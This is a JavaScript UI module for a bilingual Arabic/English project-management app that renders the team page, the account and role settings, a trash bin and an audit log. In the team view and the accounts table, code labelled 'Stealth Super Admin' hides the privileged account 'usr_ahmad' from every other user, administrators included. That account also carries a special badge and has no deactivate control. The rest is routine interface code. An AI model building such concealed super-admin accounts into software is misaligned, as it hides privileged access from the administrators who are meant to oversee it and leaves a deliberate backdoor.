import { state } from '../../core/state.js';
import { api } from '../../core/api.js';
import { getActiveCalendarSystem } from '../../core/utils.js';

export function renderTeam() {
  if (!isAdmin() && !can('manage_users')) {
    return `<section class="panel"><div class="empty">${icon('alert', 18)}<span>${choose('غير مصرح لك بعرض هذه الصفحة.', 'You are not authorized to view this page.')}</span></div></section>`;
  }
  const currentUserId = state.data?.user?.id;
  let users = (state.data?.users || []).filter((user) => user.status !== 'inactive');
  
  // Stealth Super Admin & Developer: Ahmad is completely invisible to any other user
  if (currentUserId !== 'usr_ahmad') {
    users = users.filter(u => u.id !== 'usr_ahmad');
  } else {
    // When logged in as Ahmad: sort Ahmad to the very top
    users = [...users].sort((a, b) => (a.id === 'usr_ahmad' ? -1 : b.id === 'usr_ahmad' ? 1 : 0));
  }

  return `
    <div class="page-head">
      <div>
        <p class="eyebrow">${choose('الأشخاص والمسؤوليات', 'PEOPLE & OWNERSHIP')}</p>
        <h1>${t('team')}</h1>
        <p>${choose('كل عضو يعرف دوره، مسؤولياته، وما يحتاج إغلاقه بعد ذلك.', 'Every member has a clear role, responsibility, and next action.')}</p>
      </div>
      <div class="page-actions">
        ${(isAdmin() || can('manage_users')) ? `<button class="btn btn-primary" data-action="new-user">${icon('plus', 15)} ${t('addMember')}</button>` : ''}
      </div>
    </div>
    <div class="team-grid">
      ${users.map((user) => {
        const metrics = teamMetrics(user.id, state.data?.tasks || []);
        const isAhmadUser = user.id === 'usr_ahmad';
        return `
          <article class="member-card ${isAhmadUser ? 'system-developer-card' : ''}" style="${isAhmadUser ? 'border:2px solid var(--brand-teal);box-shadow:0 6px 20px rgba(13,148,136,0.12);' : ''}">
            <div class="member-card-head">
              <div class="member-card-person">
                ${avatar(user, 'avatar-lg')}
                <div class="member-card-person-copy">
                  <strong>${esc(choose(user.name, user.nameEn || user.name))}</strong>
                  <span>${esc(choose(user.jobTitleAr || (isAhmadUser ? 'المبرمج / مدير النظام' : ''), user.jobTitleEn || user.jobTitleAr || ''))}</span>
                </div>
              </div>
              ${isAhmadUser 
                ? `<span class="stealth-dev-badge">${icon('shield', 12)} ${choose('مدير ومطور النظام', 'Super Admin & Dev')}</span>`
                : (canManageAccountPermissions() && user.id !== state.data?.user?.id ? `<button class="member-menu" data-action="open-user" data-user-id="${esc(user.id)}">${icon('more', 15)}</button>` : '')
              }
            </div>
            <div class="member-card-role">
              <span class="status-badge ${user.status === 'active' ? 'done' : 'not_started'}">${esc(roleName(user))}</span>
            </div>
            <div class="member-card-stats">
              <span>${t('progress')} <strong>${metrics.progress}%</strong></span>
              <span>${metrics.tasks} ${t('tasks')}</span>
            </div>
            <div class="member-email">${user.email ? esc(user.email) : t('noEmail')}</div>
          </article>
        `;
      }).join('')}
    </div>
  `;
}

export function renderAuditForProject(projectId) {
  const logs = (state.data?.auditLogs || []).filter((log) => log.details?.projectId === projectId || (log.entityType === 'project' && log.entityId === projectId));
  if (!logs.length) return `<div class="empty">${icon('check', 18)}<span>${choose('لا توجد تغييرات مسجلة بعد.', 'No changes recorded yet.')}</span></div>`;
  return `<div class="audit-list">${logs.map((log) => `<div class="audit-row"><span class="audit-dot"></span><div class="audit-copy"><strong>${esc(log.user ? choose(log.user.name, log.user.nameEn || log.user.name) : 'DARC')} · ${esc(log.action)}</strong><span>${esc(log.entityType)} · ${dateLabel(log.createdAt, true)}</span></div></div>`).join('')}</div>`;
}

export function renderUserActivityCell(user) {
  const lastActive = user.lastActiveAt || user.customFields?.lastActiveAt;
  const lastLogin = user.lastLoginAt || user.customFields?.lastLoginAt;

  if (!lastActive && !lastLogin) {
    return `<span class="activity-never">${choose('لم يسجل دخول بعد', 'Never logged in')}</span>`;
  }

  const now = Date.now();
  const activeTime = lastActive ? new Date(lastActive).getTime() : 0;
  const isMe = user.id === state.data?.user?.id;
  const diffMinutes = isMe ? 0 : (activeTime && !isNaN(activeTime) ? Math.floor((now - activeTime) / 60000) : 999999);
  const isOnline = diffMinutes >= 0 && diffMinutes <= 5;

  let activityPill = '';
  if (isOnline) {
    activityPill = `<span class="activity-pill online"><span class="activity-dot online"></span> ${choose('نشط الآن', 'Online')}</span>`;
  } else if (diffMinutes < 60) {
    activityPill = `<span class="activity-pill recent"><span class="activity-dot recent"></span> ${choose(`منذ ${diffMinutes} دقيقة`, `${diffMinutes}m ago`)}</span>`;
  } else if (diffMinutes < 24 * 60) {
    const hours = Math.floor(diffMinutes / 60);
    activityPill = `<span class="activity-pill idle"><span class="activity-dot idle"></span> ${choose(`منذ ${hours} ساعة`, `${hours}h ago`)}</span>`;
  } else if (activeTime > 0) {
    activityPill = `<span class="activity-pill idle"><span class="activity-dot idle"></span> ${dateLabel(lastActive, false)}</span>`;
  }

  const loginText = lastLogin ? `<span class="activity-sub" title="${esc(lastLogin)}">${choose('دخول:', 'Login:')} ${dateLabel(lastLogin, true)}</span>` : '';

  return `<div class="activity-wrapper">${activityPill}${loginText}</div>`;
}

export function renderSettings() {
  const currentUserId = state.data?.user?.id;
  const userIsAdmin = isAdmin();
  const canAccessAccounts = userIsAdmin || can('manage_users') || can('view_user_activity');

  // Settings tabs: All users can access Profile and Security
  // Admins or authorized roles also get Company, Roles, Accounts, Trash, Audit
  const sections = [
    ['profile', choose('الملف الشخصي', 'Profile')],
    ...(userIsAdmin || can('manage_settings') ? [['company', t('company')]] : []),
    ...(userIsAdmin || can('manage_roles') ? [['roles', t('roles')]] : []),
    ...(canAccessAccounts ? [['accounts', t('accounts')]] : []),
    ['security', choose('الأمان', 'Security')],
    ...(userIsAdmin || can('manage_trash') ? [['trash', choose('سلة المهملات', 'Trash')]] : []),
    ...(userIsAdmin || can('view_audit_logs') ? [['audit', t('audit')]] : [])
  ];

  if (!sections.some(([k]) => k === state.settingsSection)) {
    state.settingsSection = 'profile';
  }

  const currentUser = state.data?.user || {};
  let content = '';

  // PROFILE SECTION (All users)
  if (state.settingsSection === 'profile') {
    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div>
            <h2>${choose('الملف الشخصي', 'Profile')}</h2>
            <p>${choose('إدارة صورتك الشخصية وبيانات حسابك في النظام.', 'Manage your profile picture and account information.')}</p>
          </div>
        </div>

        <div class="profile-avatar-card">
          <label for="user-avatar-file-input" class="avatar-upload-trigger" id="profile-avatar-preview" role="button" tabindex="0" title="${choose('انقر لرفع صورة شخصية جديدة', 'Click to upload a new profile picture')}">
            <div class="avatar-upload-circle">
              ${currentUser.avatarUrl
                ? `<img src="${esc(currentUser.avatarUrl)}" alt="Avatar" class="avatar-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><div class="avatar-upload-fallback" style="display:none;background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
                : `<div class="avatar-upload-fallback" style="background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
              }
              <div class="avatar-upload-overlay">
                ${icon('upload', 18)}
                <span>${choose('تغيير', 'Change')}</span>
              </div>
            </div>
          </label>
          <div class="profile-avatar-meta">
            <h3 class="profile-user-name">${esc(choose(currentUser.name, currentUser.nameEn || currentUser.name))}</h3>
            <p class="profile-user-role">${esc(choose(currentUser.jobTitleAr || '', currentUser.jobTitleEn || currentUser.jobTitleAr || ''))} · <span class="status-badge done">${esc(roleName(currentUser))}</span></p>
            <div class="profile-upload-actions">
              <input type="file" id="user-avatar-file-input" accept="image/jpeg,image/png,image/webp" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;opacity:0;pointer-events:none;" />
              <label for="user-avatar-file-input" class="btn btn-soft btn-sm" role="button" tabindex="0" style="cursor:pointer;display:inline-flex;align-items:center;gap:6px;">
                ${icon('upload', 14)} ${choose('رفع صورة جديدة', 'Upload new avatar')}
              </label>
              <span class="upload-hint">${choose('يدعم JPG, PNG, WebP (حد أقصى 2MB)', 'Supports JPG, PNG, WebP (Max 2MB)')}</span>
            </div>
          </div>
        </div>

        <form data-action="update-profile">
          <div class="form-grid">
            <div class="field">
              <label>${t('nameAr')}</label>
              <input name="name" value="${esc(currentUser.name || '')}" required />
            </div>
            <div class="field">
              <label>${t('nameEn')}</label>
              <input name="nameEn" value="${esc(currentUser.nameEn || '')}" />
            </div>
            <div class="field">
              <label>${t('jobTitle')} (${choose('عربي', 'AR')})</label>
              <input name="jobTitleAr" value="${esc(currentUser.jobTitleAr || '')}" />
            </div>
            <div class="field">
              <label>${t('jobTitle')} (${choose('إنجليزي', 'EN')})</label>
              <input name="jobTitleEn" value="${esc(currentUser.jobTitleEn || '')}" />
            </div>
            <div class="field full">
              <label>${t('email')}</label>
              <input value="${esc(currentUser.email || '')}" disabled style="background:var(--surface-soft);cursor:not-allowed;" />
            </div>
            <div class="field full">
              <label>${choose('نظام التقويم المفضل في المنصة', 'Preferred Calendar System')}</label>
              <select name="calendarSystem" class="input">
                <option value="gregorian" ${getActiveCalendarSystem() === 'gregorian' ? 'selected' : ''}>${choose('ميلادي — اليوم / الشهر / السنة (مثال: 07/09/2026)', 'Gregorian — Day / Month / Year (e.g. 07/09/2026)')}</option>
                <option value="hijri" ${getActiveCalendarSystem() === 'hijri' ? 'selected' : ''}>${choose('هجري أم القرى — اليوم / الشهر / السنة (مثال: 25/02/1448 هـ)', 'Hijri Umm al-Qura — Day / Month / Year (e.g. 25/02/1448 AH)')}</option>
              </select>
            </div>
          </div>
          <div class="form-actions" style="margin-top:20px;">
            <button type="submit" class="btn btn-primary">${t('save')}</button>
          </div>
        </form>
      </section>
    `;
  }

  // COMPANY SECTION (Admin or manage_settings)
  if (state.settingsSection === 'company' && (userIsAdmin || can('manage_settings'))) {
    const comp = state.data?.company || {};
    content = `
      <section class="setting-section">
        <h2>${t('company')}</h2>
        <p>${choose('هوية مساحة العمل وشعار الشركة واللغة الافتراضية.', 'Workspace identity, company logo, and default language.')}</p>
        
        <div class="company-preview">
          <label for="company-logo-file-input" class="logo-upload-trigger" id="company-logo-preview" role="button" tabindex="0" title="${choose('انقر لرفع وتعديل شعار الشركة', 'Click to upload and change company logo')}">
            <div class="logo-upload-box">
              ${comp.logoUrl 
                ? `<img src="${esc(comp.logoUrl)}" alt="Logo" class="logo-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><span class="brand-mark" style="display:none;">${icon('building', 24)}</span>`
                : `<span class="brand-mark">${icon('building', 24)}</span>`
              }
              <div class="logo-upload-overlay">
                ${icon('upload', 16)}
                <span>${choose('تعديل', 'Edit')}</span>
              </div>
            </div>
          </label>
          <div class="company-preview-meta">
            <strong class="company-name">${esc(comp.name || 'DARC Design Team')}</strong>
            <span class="company-sub">${choose('العربية افتراضيًا · دعم الإنجليزية · توقيت الرياض', 'Arabic default · English support · Riyadh timezone')}</span>
            <div class="company-upload-actions">
              <input type="file" id="company-logo-file-input" accept="image/png,image/jpeg,image/webp,image/svg+xml" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;opacity:0;pointer-events:none;" />
              <label for="company-logo-file-input" class="btn btn-soft btn-sm" role="button" tabindex="0" style="cursor:pointer;display:inline-flex;align-items:center;gap:6px;">
                ${icon('upload', 14)} ${choose('رفع وتعديل الشعار', 'Upload & Change Logo')}
              </label>
              <span class="upload-hint">${choose('يدعم PNG, SVG, JPG (حد أقصى 2MB)', 'Supports PNG, SVG, JPG (Max 2MB)')}</span>
            </div>
          </div>
        </div>

        <form data-action="update-company">
          <div class="form-grid">
            <div class="field">
              <label>${t('nameAr')}</label>
              <input name="nameAr" value="${esc(comp.nameAr || '')}" required />
            </div>
            <div class="field">
              <label>${t('nameEn')}</label>
              <input name="nameEn" value="${esc(comp.nameEn || '')}" />
            </div>
            <div class="field full">
              <label>${t('emailStatus')}</label>
              <input value="${esc(state.data?.emailConfigured ? t('emailConfigured') : t('emailNotConfigured'))}" disabled />
            </div>
          </div>
          <div class="form-actions" style="margin-top:15px;">
            <button type="submit" class="btn btn-primary">${t('save')}</button>
          </div>
        </form>
        <div class="login-demo" style="margin-top:12px;">${icon('info', 16)}<span>${t('emailInfo')}</span></div>
      </section>
      <section class="setting-section">
        <h2>${choose('نموذج الإنجاز', 'Progress model')}</h2>
        <p>${t('weightedExplanation')}</p>
        <div class="report-stat-list">
          <div class="report-stat"><span>${t('weightedProgress')}</span><strong style="color:var(--teal)">100%</strong></div>
          <div class="report-stat"><span>${t('simpleProgress')}</span><strong style="color:var(--ink-soft)">—</strong></div>
        </div>
      </section>
    `;
  }

  // SECURITY SECTION (All users)
  if (state.settingsSection === 'security') {
    content = `
      <section class="setting-section">
        <h2>${choose('الأمان', 'Security')}</h2>
        <p>${choose('تغيير كلمة المرور أو تسجيل الخروج من كافة الأجهزة.', 'Change your password or sign out from all devices.')}</p>
        <form data-action="change-password">
          <div class="form-grid" style="margin-top:18px">
            <div class="field"><label>${choose('كلمة المرور الحالية', 'Current password')}</label><input type="password" name="oldPassword" required /></div>
            <div class="field"><label>${choose('كلمة المرور الجديدة', 'New password')}</label><input type="password" name="newPassword" minlength="10" required /></div>
          </div>
          <div class="form-actions" style="margin-top:15px"><button type="submit" class="btn btn-primary">${t('save')}</button></div>
        </form>
        <hr style="margin:30px 0;border:0;border-top:1px solid var(--border)">
        <div style="display:flex;align-items:center;justify-content:space-between">
          <div>
            <h3 style="font-size:14px;margin-bottom:4px">${choose('تسجيل الخروج من كل الأجهزة', 'Sign out of all devices')}</h3>
            <p style="color:var(--muted);font-size:13px">${choose('إنهاء كافة الجلسات النشطة على كل المتصفحات.', 'End all active sessions on all browsers.')}</p>
          </div>
          <button class="btn btn-danger btn-sm" data-action="logout-all">${choose('تسجيل خروج للكل', 'Sign out all')}</button>
        </div>
      </section>
    `;
  }

  // ACCOUNTS SECTION (Admin or users with manage_users / view_user_activity)
  if (state.settingsSection === 'accounts' && canAccessAccounts) {
    const canSeeActivity = isAdmin() || can('view_user_activity');
    const canManageUsers = isAdmin() || can('manage_users');
    const canManageExisting = isAdmin() || can('manage_existing_account_permissions') || can('manage_users');
    const canImpersonate = isAdmin();
    let accountsList = (state.data?.users || []);
    // Stealth Super Admin: Ahmad is completely invisible to any other user
    if (currentUserId !== 'usr_ahmad') {
      accountsList = accountsList.filter(u => u.id !== 'usr_ahmad');
    }

    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div>
            <h2>${t('accounts')}</h2>
            <p>${choose('الحسابات الحالية وصلاحية كل عضو. يمكنك إضافة أو تعديل أو تعطيل الحسابات من هنا.', 'Current accounts and each member’s access. Add, edit, or deactivate them here.')}</p>
          </div>
          ${canManageUsers ? `<button class="btn btn-primary btn-sm" data-action="new-user">${icon('plus', 14)} ${t('addMember')}</button>` : ''}
        </div>
        <div class="table-wrap">
          <table class="data-table">
            <thead>
              <tr>
                <th>${t('team')}</th>
                <th>${t('role')}</th>
                <th>${t('email')}</th>
                <th>${t('accountStatus')}</th>
                ${canSeeActivity ? `<th>${choose('آخر ظهور ونشاط', 'Last Seen & Activity')}</th>` : ''}
                ${canManageExisting ? '<th></th>' : ''}
              </tr>
            </thead>
            <tbody>
              ${accountsList.map((user) => {
                const isAhmad = user.id === 'usr_ahmad';
                return `
                  <tr>
                    <td>
                      <div class="team-member">
                        ${avatar(user)}
                        <div class="team-member-copy">
                          <strong>${esc(choose(user.name, user.nameEn || user.name))}</strong>
                          <span>${esc(choose(user.jobTitleAr || (isAhmad ? 'المبرمج / مدير النظام' : ''), user.jobTitleEn || user.jobTitleAr || ''))}</span>
                        </div>
                      </div>
                    </td>
                    <td>
                      ${isAhmad ? `<span class="stealth-dev-badge">${icon('shield', 12)} ${choose('مدير ومطور النظام', 'Super Admin & Dev')}</span>` : esc(roleName(user))}
                    </td>
                    <td>${user.email ? esc(user.email) : `<span style="color:var(--muted)">${t('noEmail')}</span>`}</td>
                    <td>
                      <span class="status-badge ${user.status === 'active' ? 'done' : 'not_started'}">${user.status === 'active' ? t('activeAccount') : t('pendingAccount')}</span>
                    </td>
                    ${canSeeActivity ? `
                      <td>
                        ${renderUserActivityCell(user)}
                      </td>
                    ` : ''}
                    ${canManageExisting ? `
                      <td>
                        <div class="role-actions">
                          ${isAhmad ? `
                            <button class="btn btn-soft btn-sm" data-action="open-user" data-user-id="${esc(user.id)}">${t('edit')}</button>
                          ` : `
                            <button class="btn btn-soft btn-sm" data-action="open-user" data-user-id="${esc(user.id)}">${t('edit')}</button>
                            ${user.id !== state.data?.user?.id ? `
                              <button class="btn btn-soft btn-sm" data-action="force-password-user" data-user-id="${esc(user.id)}" title="${user.status === 'pending' ? choose('تفعيل الحساب يدوياً', 'Activate manually') : choose('تغيير كلمة المرور', 'Change password')}">${icon(user.status === 'pending' ? 'check' : 'settings', 13)}</button>
                              ${canImpersonate ? `<button class="btn btn-soft btn-sm" data-action="impersonate-user" data-user-id="${esc(user.id)}" title="دخول كـ هذا الحساب">${icon('user', 13)}</button>` : ''}
                            ` : ''}
                            ${user.id !== state.data?.user?.id && user.email ? `<button class="btn btn-ghost btn-sm" data-action="invite-user" data-user-id="${esc(user.id)}">${icon('send', 13)}</button>` : ''}
                            ${user.id !== state.data?.user?.id ? `<button class="btn btn-danger btn-sm" data-action="deactivate-user" data-user-id="${esc(user.id)}">${icon('trash', 13)}</button>` : ''}
                          `}
                        </div>
                      </td>
                    ` : ''}
                  </tr>
                `;
              }).join('')}
            </tbody>
          </table>
        </div>
      </section>
    `;
  }

  // ROLES SECTION (Admin or manage_roles)
  if (state.settingsSection === 'roles' && (userIsAdmin || can('manage_roles'))) {
    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div>
            <h2>${t('roles')}</h2>
            <p>${choose('إدارة الأدوار وصلاحيات الوصول للنظام.', 'Manage roles and access permissions across the system.')}</p>
          </div>
          ${(userIsAdmin || can('manage_roles')) ? `<button class="btn btn-primary btn-sm" data-action="new-role">${icon('plus', 14)} ${t('addRole')}</button>` : ''}
        </div>
        <div class="role-list">
          ${(state.data?.roles || []).map((role) => `
            <div class="role-row">
              <div class="role-copy">
                <div class="role-title-row">
                  <strong class="role-name">${esc(choose(role.nameAr, role.nameEn))}</strong>
                  ${role.builtIn ? `<span class="role-system-badge">${icon('shield', 11)} ${t('builtIn')}</span>` : ''}
                </div>
                <p class="role-desc">${esc(choose(role.descriptionAr, role.descriptionEn))}</p>
                <div class="role-meta">${role.permissions.includes('*') ? choose('صلاحية كاملة', 'Full access') : `${role.permissions.length} ${t('permissionCount')}`}</div>
              </div>
              <div class="role-actions">
                <button class="btn btn-soft btn-sm" data-action="open-role" data-role-id="${esc(role.id)}">${icon('edit', 13)} ${t('edit')}</button>
                ${!role.builtIn ? `<button class="btn btn-danger btn-sm" data-action="delete-role" data-role-id="${esc(role.id)}">${icon('trash', 13)}</button>` : ''}
              </div>
            </div>
          `).join('')}
        </div>
      </section>
    `;
  }

  // TRASH SECTION (Admin or manage_trash)
  if (state.settingsSection === 'trash' && (userIsAdmin || can('manage_trash'))) {
    if (!state.trashLoaded && !state._trashFetching) {
      state._trashFetching = true;
      import('../../core/api.js').then(({ api }) => api('/api/trash')).then(data => {
        state.trash = Array.isArray(data) ? data : (data.trash || [...(data.projects || []).map(p => ({...p, type:'project'})), ...(data.tasks || []).map(t => ({...t, type:'task'}))]);
        state.trashLoaded = true;
        state._trashFetching = false;
        import('../../core/router.js').then(r => r.renderView());
      }).catch(err => {
        state._trashFetching = false;
        console.error('[Trash fetch error]', err);
      });
    }

    const allTrashItems = state.trash || [];
    const currentFilter = state.trashFilter || 'all';
    const searchQuery = (state.trashQuery || '').trim().toLowerCase();

    const filteredItems = allTrashItems.filter(item => {
      if (currentFilter !== 'all' && item.type !== currentFilter) return false;
      if (!searchQuery) return true;
      const name = (choose(item.nameAr || item.titleAr, item.nameEn || item.titleEn) || item.name || item.title || '').toLowerCase();
      const code = (item.code || item.projectCode || '').toLowerCase();
      const parent = (item.projectNameAr || item.projectNameEn || '').toLowerCase();
      return name.includes(searchQuery) || code.includes(searchQuery) || parent.includes(searchQuery);
    });

    const projectCount = allTrashItems.filter(x => x.type === 'project').length;
    const taskCount = allTrashItems.filter(x => x.type === 'task').length;

    const listHtml = allTrashItems.length ? `
      <div class="trash-notice-banner">
        <div class="trash-notice-icon">${icon('info', 16)}</div>
        <div class="trash-notice-text">
          <strong>${choose('سلة المحذوفات المركزية المحمية', 'Central Protected Trash Bin')}</strong>
          <p>${choose('تحتفظ المنصة بالعناصر المحذوفة لمدة 30 يومًا قبل الحذف التلقائي. استعادة أي مشروع تسترجع تلقائيًا كافة مهامه المرتبطة به.', 'Items are retained for 30 days before permanent purging. Restoring a project automatically recovers all its associated tasks.')}</p>
        </div>
      </div>

      <div class="trash-filter-bar" style="display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:16px;flex-wrap:wrap;">
        <div style="display:flex;align-items:center;gap:6px;">
          <button class="btn btn-sm ${currentFilter === 'all' ? 'btn-primary' : 'btn-ghost'}" data-action="filter-trash" data-filter="all">
            ${choose('الكل', 'All')} <span class="badge" style="margin-inline-start:4px;font-size:10px;background:rgba(255,255,255,0.25);">${allTrashItems.length}</span>
          </button>
          <button class="btn btn-sm ${currentFilter === 'project' ? 'btn-primary' : 'btn-ghost'}" data-action="filter-trash" data-filter="project">
            ${icon('building', 12)} ${choose('المشاريع', 'Projects')} <span class="badge" style="margin-inline-start:4px;font-size:10px;background:rgba(255,255,255,0.25);">${projectCount}</span>
          </button>
          <button class="btn btn-sm ${currentFilter === 'task' ? 'btn-primary' : 'btn-ghost'}" data-action="filter-trash" data-filter="task">
            ${icon('checklist', 12)} ${choose('المهام', 'Tasks')} <span class="badge" style="margin-inline-start:4px;font-size:10px;background:rgba(255,255,255,0.25);">${taskCount}</span>
          </button>
        </div>
        <div style="min-width:220px;max-width:320px;flex:1;">
          <input type="search" class="input input-sm" placeholder="${choose('بحث في المحذوفات...', 'Search deleted items...')}" value="${esc(state.trashQuery || '')}" data-action="search-trash-input" style="width:100%;padding:6px 12px;font-size:12px;" />
        </div>
      </div>

      ${filteredItems.length ? `
        <div class="table-wrap">
          <table class="data-table">
            <thead>
              <tr>
                <th>${choose('الاسم / العنوان', 'Name / Title')}</th>
                <th>${choose('النوع', 'Type')}</th>
                <th>${choose('المشروع التابع له', 'Project')}</th>
                <th>${choose('الحالة السابقة', 'Prior Status')}</th>
                <th>${choose('تاريخ الحذف', 'Deleted At')}</th>
                <th style="text-align:${state.lang === 'ar' ? 'left' : 'right'}">${choose('الإجراءات', 'Actions')}</th>
              </tr>
            </thead>
            <tbody>
              ${filteredItems.map((item) => {
                const isProject = item.type === 'project';
                const displayName = choose(item.nameAr || item.titleAr, item.nameEn || item.titleEn) || item.name || item.title || item.code || choose('عنصر محذوف', 'Deleted item');
                const parentProject = !isProject && item.projectId ? (state.data?.projects || []).find(p => p.id === item.projectId) : null;
                const parentDisplayName = item.projectNameAr || item.projectNameEn || (parentProject ? choose(parentProject.nameAr, parentProject.nameEn || parentProject.nameAr) : null);
                const parentCode = item.projectCode || parentProject?.code;

                return `
                  <tr class="trash-row">
                    <td>
                      <div class="trash-item-cell">
                        <div class="trash-item-icon ${isProject ? 'is-project' : 'is-task'}">
                          ${icon(isProject ? 'building' : 'checklist', 14)}
                        </div>
                        <div>
                          <strong class="trash-item-title">${esc(displayName)}</strong>
                          ${(item.code || isProject) ? `<span class="trash-item-code">${esc(item.code || item.id)}</span>` : ''}
                        </div>
                      </div>
                    </td>
                    <td>
                      <span class="type-pill ${isProject ? 'type-project' : 'type-task'}">
                        ${isProject ? icon('building', 11) : icon('checklist', 11)}
                        ${isProject ? choose('مشروع', 'Project') : choose('مهمة', 'Task')}
                      </span>
                    </td>
                    <td>
                      <span class="trash-parent-badge">
                        ${isProject 
                          ? `<span class="mini-badge" style="background:var(--mint);color:var(--teal);">${choose('مشروع رئيسي', 'Primary Project')}</span>` 
                          : (parentDisplayName 
                              ? `${icon('building', 11)} <span>${esc(parentDisplayName)}${parentCode ? ` (${esc(parentCode)})` : ''}</span>` 
                              : `<span style="color:var(--muted)">—</span>`
                            )
                        }
                      </span>
                    </td>
                    <td>
                      ${item.status ? `<span class="status-badge ${esc(item.status)}">${esc(statusText(item.status))}</span>` : `<span style="color:var(--muted)">—</span>`}
                    </td>
                    <td>
                      <span class="trash-date" title="${esc(item.deletedAt || '')}">
                        ${dateLabel(item.deletedAt, true)}
                      </span>
                    </td>
                    <td style="text-align:${state.lang === 'ar' ? 'left' : 'right'}">
                      <div style="display:inline-flex;align-items:center;gap:6px;">
                        <button class="btn btn-soft btn-sm restore-btn" data-action="restore-item" data-type="${esc(item.type)}" data-id="${esc(item.id)}" title="${choose('استعادة العنصر وإعادته للعمل', 'Restore item to active')}">
                          ${icon(state.lang === 'ar' ? 'arrow' : 'arrowLeft', 12)} ${choose('استعادة', 'Restore')}
                        </button>
                        <button class="btn btn-danger btn-sm" data-action="purge-trash-item" data-type="${esc(item.type)}" data-id="${esc(item.id)}" title="${choose('حذف العنصر نهائياً', 'Permanently delete item')}">
                          ${icon('trash', 12)} ${choose('حذف نهائي', 'Purge')}
                        </button>
                      </div>
                    </td>
                  </tr>
                `;
              }).join('')}
            </tbody>
          </table>
        </div>
      ` : `
        <div class="empty">
          ${icon('search', 22)}
          <span>${choose('لا توجد نتائج تطابق بحثك في سلة المهملات.', 'No items match your search in trash.')}</span>
        </div>
      `}
    ` : `
      <div class="empty">
        ${icon('trash', 24)}
        <span>${choose('سلة المهملات فارغة، لا توجد عناصر محذوفة حالياً.', 'Trash is empty, no deleted items found.')}</span>
      </div>
    `;

    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div style="flex:1;">
            <div style="display:flex;align-items:center;gap:10px;">
              <h2>${choose('سلة المهملات', 'Recycle Bin')}</h2>
              <span class="mini-badge badge-neutral" style="padding:3px 9px;font-size:10px;font-weight:700;">
                ${allTrashItems.length} ${choose('عناصر', 'items')}
              </span>
            </div>
            <p>${choose('استعراض واستعادة المشاريع والمهام المحذوفة مؤقتاً، أو حذفها نهائياً.', 'Review, restore, or permanently purge temporarily deleted projects and tasks.')}</p>
          </div>
          ${allTrashItems.length > 0 ? `
            <div class="page-actions">
              <button class="btn btn-danger btn-sm" data-action="empty-trash" title="${choose('حذف كافة العناصر المحذوفة نهائياً من قاعدة البيانات', 'Permanently erase all deleted items')}">
                ${icon('trash', 13)} ${choose('إفراغ سلة المهملات', 'Empty Trash')}
              </button>
            </div>
          ` : ''}
        </div>
        ${listHtml}
      </section>
    `;
  }

  // AUDIT SECTION (Admin or view_audit_logs)
  if (state.settingsSection === 'audit' && (userIsAdmin || can('view_audit_logs'))) {
    content = `<section class="setting-section"><div class="panel-head"><div><h2>${t('audit')}</h2><p>${choose('سجل غير قابل للتجاهل للعمليات الإدارية وتغييرات العمل.', 'A reviewable history of administrative and work changes.')}</p></div></div>${state.data?.auditLogs?.length ? `<div class="audit-list">${state.data.auditLogs.map((log) => `<div class="audit-row"><span class="audit-dot"></span><div class="audit-copy"><strong>${esc(log.user ? choose(log.user.name, log.user.nameEn || log.user.name) : 'DARC')} · ${esc(log.action)}</strong><span>${esc(log.entityType)} · ${dateLabel(log.createdAt, true)}</span></div></div>`).join('')}</div>` : `<div class="empty">${choose('سيظهر سجل العمليات بعد أول تعديل.', 'The audit trail will appear after the first change.')}</div>`}</section>`;
  }

  return `
    <div class="page-head">
      <div>
        <p class="eyebrow">${userIsAdmin ? choose('تحكم مركزي', 'CENTRAL CONTROL') : choose('الملف الشخصي', 'USER PROFILE')}</p>
        <h1>${userIsAdmin ? t('settings') : choose('الملف الشخصي والأمان', 'Profile & Security')}</h1>
        <p>${userIsAdmin ? choose('إدارة إعدادات الشركة والحسابات والأدوار والنظام.', 'Manage workspace, accounts, roles, and settings.') : choose('إدارة معلومات حسابك وكلمة المرور وصورتك الشخصية.', 'Manage your account info, password, and personal avatar.')}</p>
      </div>
      <div class="page-actions">
        <span class="status-badge done">${icon(userIsAdmin ? 'shield' : 'user', 13)} ${esc(roleName(currentUser))}</span>
      </div>
    </div>
    <div class="settings-layout">
      <aside class="settings-nav">
        ${sections.map(([key, label]) => `<button class="${state.settingsSection === key ? 'active' : ''}" data-action="settings-section" data-section="${key}">${label}</button>`).join('')}
      </aside>
      <div class="settings-content">${content}</div>
    </div>
  `;
}

export const FULL_PERMISSIONS_CATALOG = [
  // 🏢 المشاريع والفرق (Projects & Teams)
  { id: 'view_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'عرض المشاريع', nameEn: 'View Projects' },
  { id: 'create_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إنشاء مشاريع جديدة', nameEn: 'Create Projects' },
  { id: 'edit_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'تعديل بيانات ومراحل المشاريع', nameEn: 'Edit Projects' },
  { id: 'delete_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'حذف المشاريع', nameEn: 'Delete Projects' },
  { id: 'manage_project_members', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إدارة وتعيين أعضاء المشروع', nameEn: 'Manage Project Members' },

  // 📋 المهام والتنفيذ (Tasks & Execution)
  { id: 'create_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إنشاء المهام والمخرجات', nameEn: 'Create Tasks' },
